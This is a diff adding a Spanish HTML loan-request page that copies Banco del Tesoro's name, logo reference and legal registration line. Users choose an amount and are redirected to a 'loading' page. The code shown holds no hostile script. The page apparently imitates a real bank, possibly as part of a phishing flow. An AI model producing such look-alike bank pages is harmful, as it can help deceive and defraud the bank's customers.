@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solicitar Préstamo</title>
+    <style>
+        :root {
+            --main-bg-color: #1511A0;
+            --button-bg-color: #EF3641;
+            --button-hover-color: #d32f2f;
+            --text-color: #0F172A; /* Texto negro */
+            --font-family: Arial, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            font-family: var(--font-family);
+            background-color: #fff; /* Fondo blanco */
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            text-align: center;
+        }
+
+        .logo img {
+            width: 18%;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .loan-options {
+            margin-bottom: 20px;
+        }
+
+        .loan-option {
+            background-color: var(--button-bg-color);
+            color: white; /* Texto blanco en los botones */
+            border: none;
+            border-radius: 8px;
+            padding: 10px;
+            margin: 5px 0;
+            width: 100%;
+            max-width: 400px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .loan-option:hover {
+            background-color: var(--button-hover-color);
+        }
+
+        .loan-option.selected {
+            background-color: #28a745; /* Verde cuando se selecciona */
+        }
+
+        .selected-message {
+            color: #28a745;
+            font-size: 14px;
+            margin-bottom: 15px;
+            display: none; /* Oculto por defecto */
+        }
+
+        button[type="submit"] {
+            width: 100%;
+            max-width: 400px;
+            background-color: var(--main-bg-color);
+            color: white; /* Texto blanco */
+            font-size: 16px;
+            padding: 10px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button[type="submit"]:hover {
+            background-color: #0f0d86;
+        }
+
+        footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: var(--text-color);
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <img src="logo-slogan.png" alt="BT En Línea">
+    </div>
+    <h2>Solicitar Préstamo</h2>
+    <p>Elige el monto que deseas solicitar y procede a la solicitud.</p>
+    <div class="loan-options">
+        <button class="loan-option" onclick="selectLoanOption('Bs 10,000', this)">Monto: Bs 10,000</button>
+        <button class="loan-option" onclick="selectLoanOption('Bs 15,000', this)">Monto: Bs 15,000</button>
+        <button class="loan-option" onclick="selectLoanOption('Bs 20,000', this)">Monto: Bs 20,000</button>
+        <button class="loan-option" onclick="selectLoanOption('Bs 40,000', this)">Monto: Bs 40,000</button>
+    </div>
+    <div id="selected-message" class="selected-message"></div>
+    <button type="submit" onclick="proceedToApplication()">Continuar</button>
+    <footer>
+        <p>&copy; Banco del Tesoro, C.A. Banco Universal © RIF G-20005187-6.</p>
+        <p>Todos los derechos reservados.</p>
+    </footer>
+
+    <script>
+        let selectedLoanAmount = '';
+
+        function selectLoanOption(amount, button) {
+            selectedLoanAmount = amount;
+
+            // Remover clase 'selected' de todos los botones
+            const options = document.querySelectorAll('.loan-option');
+            options.forEach(option => option.classList.remove('selected'));
+
+            // Agregar clase 'selected' al botón clickeado
+            button.classList.add('selected');
+
+            // Mostrar el mensaje en la página
+            const messageElement = document.getElementById('selected-message');
+            messageElement.textContent = `Has seleccionado el monto: ${amount}`;
+            messageElement.style.display = 'block';
+        }
+
+        function proceedToApplication() {
+            if (selectedLoanAmount === '') {
+                alert("Por favor, selecciona un monto antes de proceder.");
+            } else {
+                window.location.href = "cargando.html";
+            }
+        }
+    </script>
+</body>
+</html>
